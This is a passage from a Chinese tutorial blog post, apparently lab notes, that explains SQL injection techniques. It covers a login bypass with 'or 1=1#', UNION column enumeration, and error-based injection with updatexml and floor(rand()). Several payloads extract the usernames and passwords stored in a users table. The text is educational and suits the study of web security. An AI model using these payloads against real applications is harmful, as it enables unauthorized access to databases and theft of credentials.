class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/p&gt;
&lt;p&gt;这时只判断了 admin 是否存在，但是这里还需要知道用户名，有没有一种方法不用用户名也能登录呢，有的&lt;/p&gt;
&lt;p&gt;我们使用上面有用到的 or&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220925113956855.png&#34; alt=&#34;image-20220925113956855&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;SELECT&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;FROM&lt;/span&gt; users &lt;span class=&#34;token keyword&#34;&gt;WHERE&lt;/span&gt; username&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;1&#39;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;or&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token comment&#34;&gt;#&#39; and password=&#39;&#39; LIMIT 0,1&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/p&gt;
&lt;p&gt;这里 or 是并运算，那么前后只需要成立一个便可&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220925114457385.png&#34; alt=&#34;image-20220925114457385&#34; /&gt;&lt;/p&gt;
&lt;p&gt;这里是可以执行成功的&lt;/p&gt;
&lt;h2 id=&#34;联合查询的sql注入&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#联合查询的sql注入&#34;&gt;#&lt;/a&gt; 联合查询的 SQL 注入&lt;/h2&gt;
&lt;p&gt;当应用程序容易受到 SQL 注入的攻击，并且在应用程序的响应中返回查询结果时，可以使用关键字从数据库中的其他表中检索数据。这会导致 SQL 注入联合攻击。&lt;em&gt;&lt;strong&gt;UNION&lt;/strong&gt;&lt;/em&gt; 该关键字允许您执行一个或多个附加查询，并将结果追加到原始查询&lt;/p&gt;
&lt;p&gt;使用 UNION 需要满足两个条件&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;各个查询必须返回相同数量的列。&lt;/li&gt;
&lt;li&gt;每列中的数据类型必须在各个查询之间兼容。&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;确定sql注入攻击中所需要的列数&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#确定sql注入攻击中所需要的列数&#34;&gt;#&lt;/a&gt; 确定 SQL 注入攻击中所需要的列数&lt;/h3&gt;
&lt;p&gt;有两个方法可以判断&lt;/p&gt;
&lt;p&gt;第一种方法涉及注入一系列子句并递增指定的列索引，直到发生错误&lt;/p&gt;
&lt;p&gt;&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token string&#34;&gt;&#39; ORDER BY 1--
&#39;&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;ORDER&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;BY&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token comment&#34;&gt;--&lt;/span&gt;
&#39; &lt;span class=&#34;token keyword&#34;&gt;ORDER&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;BY&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;token comment&#34;&gt;--&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/p&gt;
&lt;p&gt;第二种方法涉及提交一系列有效负载，指定不同数量的 值&lt;/p&gt;
&lt;p&gt;&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token string&#34;&gt;&#39; UNION SELECT NULL--
&#39;&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;UNION&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;SELECT&lt;/span&gt; &lt;span class=&#34;token boolean&#34;&gt;NULL&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token boolean&#34;&gt;NULL&lt;/span&gt;&lt;span class=&#34;token comment&#34;&gt;--&lt;/span&gt;
&#39; &lt;span class=&#34;token keyword&#34;&gt;UNION&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;SELECT&lt;/span&gt; &lt;span class=&#34;token boolean&#34;&gt;NULL&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token boolean&#34;&gt;NULL&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token boolean&#34;&gt;NULL&lt;/span&gt;&lt;span class=&#34;token comment&#34;&gt;--&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/p&gt;
&lt;p&gt;上面都是当列数不匹配时会返回错误&lt;/p&gt;
&lt;h3 id=&#34;查找具有有用数据类型的列&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#查找具有有用数据类型的列&#34;&gt;#&lt;/a&gt; 查找具有有用数据类型的列&lt;/h3&gt;
&lt;p&gt;要检索的相关数据将采用字符串形式，因此您需要在原始查询结果中查找数据类型为字符串数据或与字符串数据兼容的一列或多列。&lt;/p&gt;
&lt;p&gt;&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token string&#34;&gt;&#39; UNION SELECT &#39;&lt;/span&gt;a&lt;span class=&#34;token string&#34;&gt;&#39;,NULL,NULL,NULL--
&#39;&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;UNION&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;SELECT&lt;/span&gt; &lt;span class=&#34;token boolean&#34;&gt;NULL&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;a&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token boolean&#34;&gt;NULL&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token boolean&#34;&gt;NULL&lt;/span&gt;&lt;span class=&#34;token comment&#34;&gt;--&lt;/span&gt;
&lt;span class=&#34;token string&#34;&gt;&#39; UNION SELECT NULL,NULL,&#39;&lt;/span&gt;a&lt;span class=&#34;token string&#34;&gt;&#39;,NULL--
&#39;&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;UNION&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;SELECT&lt;/span&gt; &lt;span class=&#34;token boolean&#34;&gt;NULL&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token boolean&#34;&gt;NULL&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token boolean&#34;&gt;NULL&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;a&#39;&lt;/span&gt;&lt;span class=&#34;token comment&#34;&gt;--&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/p&gt;
&lt;h2 id=&#34;报错注入&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#报错注入&#34;&gt;#&lt;/a&gt; 报错注入&lt;/h2&gt;
&lt;p&gt;主要是三种报错注入的方式，分别是 updatexml，floor 和 exp&lt;/p&gt;
&lt;h3 id=&#34;updatexml&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#updatexml&#34;&gt;#&lt;/a&gt; updatexml&lt;/h3&gt;
&lt;p&gt;原理从本质来说就是函数的报错&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221001004112785.png&#34; alt=&#34;image-20221001004112785&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;select&lt;/span&gt; updatexml&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;concat&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0x7e&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;version&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0x7e&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/p&gt;
&lt;p&gt;这里的 version 替换成查询语句即可，下面是两个例子&lt;/p&gt;
&lt;p&gt;&lt;pre class=&#34;line-numbers language-none&#34;&gt;&lt;code class=&#34;language-none&#34;&gt;&amp;#39;) and updatexml(1,concat(0x7e,database(),0x7e),1)#
&amp;#39;) and updatexml(1,concat(0x7e,(select group_concat(username,0x7e,password) from users),0x7e),1)#&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/p&gt;
&lt;h3 id=&#34;floor&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#floor&#34;&gt;#&lt;/a&gt; floor&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;关键函数：&lt;/strong&gt;&lt;br /&gt;
&lt;strong&gt;Rand () ------- 产生 0~1 的伪随机数&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;rand 有两种形式：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;1、rand (), 即无参数的，此时产生的随机数是随机的，不可重复的；&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;2、rand (n), 即有参数数，如 rand (0), 这里 0 相当于种子，那么这里会产生一列伪随机数。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Floor () ------- 向下取整数&lt;/strong&gt;&lt;br /&gt;
&lt;strong&gt; Concat () ----- 连接字符串&lt;/strong&gt;&lt;br /&gt;
&lt;strong&gt; Count () ------ 计算总数&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;1，count(*)&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;返回表中的记录数 (包括所有列)，相当于统计表的行数 (不会忽略列值为 NULL 的记录)&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;2，count (列名)&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;返回列名指定列的记录数&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;group by x  作用以 x 为主键分组&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;主键，指的是一个列或多列的组合，其值能唯一地标识表中的每一行&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;其实在做的时候分为两步首先扫描一行一行的扫描主键，如果虚拟表中有值则跳过，如果没有第二步将值放入虚表中&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;*&lt;strong&gt; 首先 rand () 是随机生成一个 0 到 1 之间的随机数 *&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/2793566-20220317003828506-513556717.png&#34; alt=&#34;img&#34; /&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;然后一般在 floor 中使用是会乘以 2 既 floor (rand ()*2),floor 的作用是对数向下取整，则整个语句会形成一串伪随机 011011....。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/2793566-20220317003909146-1883988726.png&#34; alt=&#34;img&#34; /&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;count (*) 的效果&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/2793566-20220317005059387-2031388179.png&#34; alt=&#34;img&#34; /&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/2793566-20220317004937232-708877907.png&#34; alt=&#34;img&#34; /&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;对于 select floor (rand (0)*2),count (*) from users group by floor (rand (0)*2); 报错&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/2793566-20220318131113712-1472090330.png&#34; alt=&#34;img&#34; /&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;过程解析&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;1，group by 时，会建立空虚拟表如下图，然后从 sql 语句执行结果序列（011011）读取数据并插入虚表:&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/2793566-20220318130922453-1410766243.png&#34; alt=&#34;img&#34; /&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;2，虚表写入第一个数据 (前一个 floor 部分进行一次计算，“第一次计算”）扫描主键，发现没有与 0 对应的主建，新建主键（这个主键的值是后面一个 floor 部分进行一次计算的值，“第二次计算”）如图&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/2793566-20220318131856877-641578374.png&#34; alt=&#34;img&#34; /&gt;&lt;/p&gt;
&lt;p&gt;3，写入第二个数据（前一个 floor 部分计算的值，“第三次计算”）有对应的主键 count（*）加一（这里就没有再计算后面的 floor 部分）&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/2793566-20220318132321527-1779841079.png&#34; alt=&#34;img&#34; /&gt;&lt;/p&gt;
&lt;p&gt;4，写入第三个数据（前一个 floor 计算的值，“第四次计算”）扫描主键，发现没有与 0 对应的主建（刚刚建的主键记录的值实际为 1），新建主键（这个主键的值是后面一个 floor 部分进行一次计算的值，“第五次计算”）新建的主键值又为 1，因为主键不能重复，所以报错&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/2793566-20220318132958429-1301912811.png&#34; alt=&#34;img&#34; /&gt;&lt;/p&gt;
&lt;p&gt;简单来说就是 rand 和 group by 的冲突&lt;/p&gt;
&lt;p&gt;接下来是例子&lt;/p&gt;
&lt;p&gt;&#39;) union select count(*),concat((select user()),floor(rand(0)*2))a from information_schema.columns group by a#&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/2793566-20220314170034190-29499768.png&#34; alt=&#34;img&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&#39;) union select count(*),concat((select password from users),floor(rand(0)*2))a from information_schema.tables group by a#&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/2793566-20220314170056710-97820973.png&#34; alt=&#34;img&#34; /&gt;&lt;/p&gt;
&lt;h3 id=&#34;exp&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#exp&#34;&gt;#&lt;/a&gt; exp&lt;/h3&gt;
&lt;p&gt;exp () 函数的报错原理是溢出报错&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221001005353035.png&#34; alt=&#34;image-20221001005353035&#34; /&gt;&lt;/p&gt;
&lt;p&gt;使用方法如上，这个地方并没有成功，暂不知是什么原因，有待解决&lt;/p&gt;
&lt;h2 id=&#34;bool盲注&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#bool盲注&#34;&gt;#&lt;/a&gt; Bool 盲注&lt;/h2&gt;
&lt;p&gt;盲注一般使用在开发者将报错信息屏蔽时使用，虽然报错信息被屏蔽，但是页面会有不同的回显，常用的方式是在注入点后面加上 and 1=1 或者 and 1=2，如果存在注入点那么 and 1=2 的情况下，页面会有所不同，有些教程会把报错注入也归为盲注的一种，这里记录一下报错注入和盲注常用的函数&lt;/p&gt;
&lt;h3 id=&#34;常用函数&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#常用函数&#34;&gt;#&lt;/a&gt; 常用函数&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;截取函数&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;substr()&lt;/p&gt;
&lt;p&gt;&lt;pre class=&#34;line-numbers language-markup&#34; data-language=&#34;markup&#34;&gt;&lt;code class=&#34;language-markup&#34;&gt;用法：substr(string string,num start,num length);

select  substr(参数1，参数2，参数3)  from  表名

string为字符串；start为起始位置；length为长度。

注意：mysql中的start是从1开始的。&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;left()&lt;/p&gt;
&lt;p&gt;&lt;pre class=&#34;line-numbers language-none&#34;&gt;&lt;code class=&#34;language-none&#34;&gt;LEFT(str,length);
SQL
LEFT()函数接受两个参数：

str是要提取子字符串的字符串。length是一个正整数，指定将从左边返回的字符数。
LEFT()函数返回str字符串中最左边的长度字符。如果str或length参数为NULL，则返回NULL值。&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;right()&lt;/p&gt;
&lt;p&gt;&lt;pre class=&#34;line-numbers language-none&#34;&gt;&lt;code class=&#34;language-none&#34;&gt;【实例】使用 RIGHT 函数返回字符串中右边的字符，输入的 SQL 语句和执行结果如下所示。
mysql&amp;gt; SELECT RIGHT(&amp;#39;MySQL&amp;#39;,3);
+------------------+
| RIGHT(&amp;#39;MySQL&amp;#39;,3) |
+------------------+
| SQL              |
+------------------+
1 row in set (0.00 sec)
由执行结果可知，函数返回字符串“MySQL”右边开始的长度为3的子字符串，结果为“SQL”。&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;转换函数&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;ascii()&lt;/p&gt;
&lt;p&gt;&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;返回字符串str的最左字符的数值。返回&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;，如果str为空字符串。返回&lt;span class=&#34;token boolean&#34;&gt;NULL&lt;/span&gt;，如果str为&lt;span class=&#34;token boolean&#34;&gt;NULL&lt;/span&gt;。 ASCII&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;返回数值是从&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;到&lt;span class=&#34;token number&#34;&gt;255&lt;/span&gt;。

									
									
									&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;adsbygoogle &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; window&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;adsbygoogle &lt;span class=&#34;token operator&#34;&gt;||&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;push&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&amp;#123;&amp;#125;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
									
									
									
									&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;adsbygoogle &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; window&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;adsbygoogle &lt;span class=&#34;token operator&#34;&gt;||&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;push&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&amp;#123;&amp;#125;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
									&lt;span class=&#34;token keyword&#34;&gt;SQL&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;&gt;&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;SELECT&lt;/span&gt; ASCII&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;2&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;token comment&#34;&gt;---------------------------------------------------------+&lt;/span&gt;
&lt;span class=&#34;token operator&#34;&gt;|&lt;/span&gt; ASCII&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;2&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;                                              &lt;span class=&#34;token operator&#34;&gt;|&lt;/span&gt;
&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;token comment&#34;&gt;---------------------------------------------------------+&lt;/span&gt;
&lt;span class=&#34;token operator&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;50&lt;/span&gt;                                                      &lt;span class=&#34;token operator&#34;&gt;|&lt;/span&gt;
&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;token comment&#34;&gt;---------------------------------------------------------+&lt;/span&gt;
&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;row&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;set&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0.00&lt;/span&gt; sec&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;

&lt;span class=&#34;token keyword&#34;&gt;SQL&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;&gt;&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;SELECT&lt;/span&gt; ASCII&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;dx&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;token comment&#34;&gt;---------------------------------------------------------+&lt;/span&gt;
&lt;span class=&#34;token operator&#34;&gt;|&lt;/span&gt; ASCII&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;dx&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;                                             &lt;span class=&#34;token operator&#34;&gt;|&lt;/span&gt;
&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;token comment&#34;&gt;---------------------------------------------------------+&lt;/span&gt;
&lt;span class=&#34;token operator&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;100&lt;/span&gt;                                                     &lt;span class=&#34;token operator&#34;&gt;|&lt;/span&gt;
&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;token comment&#34;&gt;---------------------------------------------------------+&lt;/span&gt;
&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;row&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;set&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0.00&lt;/span&gt; sec&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
